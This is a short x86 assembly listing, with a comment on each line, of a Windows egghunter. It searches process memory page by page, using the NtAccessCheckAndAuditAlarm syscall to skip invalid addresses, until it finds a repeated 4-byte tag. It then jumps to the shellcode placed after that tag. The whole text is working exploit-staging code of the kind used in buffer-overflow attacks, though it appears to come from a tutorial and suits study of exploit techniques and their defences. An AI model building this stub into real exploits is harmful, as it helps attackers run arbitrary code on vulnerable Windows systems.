
next_page:

	or dx,0x0fff        ; get last address in page
	
next_addr:	
	inc edx             ; acts as a counter
				              ;(increments the value in EDX)
	push edx            ; pushes edx value to the  stack
				              ;(saves our current address on the stack)
	push byte +0x2      ; push 0x2 for NtAccessCheckAndAuditAlarm
                      ; or 0x43 for NtDisplayString to stack
	pop eax             ; pop 0x2 or 0x43 into eax
                      ; so it can be used as parameter
                      ; to syscall - see next
	int 0x2e            ; tell the kernel i want a do a
                      ; syscall using previous register
	cmp al,0x5          ; check if access violation occurs
                      ;(0xc0000005== ACCESS_VIOLATION) 5
	pop edx             ; restore edx
	je next_page        ; jmp back to start dx 0x0fffff
	mov eax,0x50905090  ; this is the tag (egg)
	mov edi,edx         ; set edi to our pointer
	scasd               ; compare for status
	jnz next_addr       ; (back to inc edx) check egg found or not
	scasd               ; when egg has been found
	jnz next_addr       ; (jump back to "inc edx")
				              ; if only the first egg was found
  jmp edi             ; edi points to begin of the shellcode
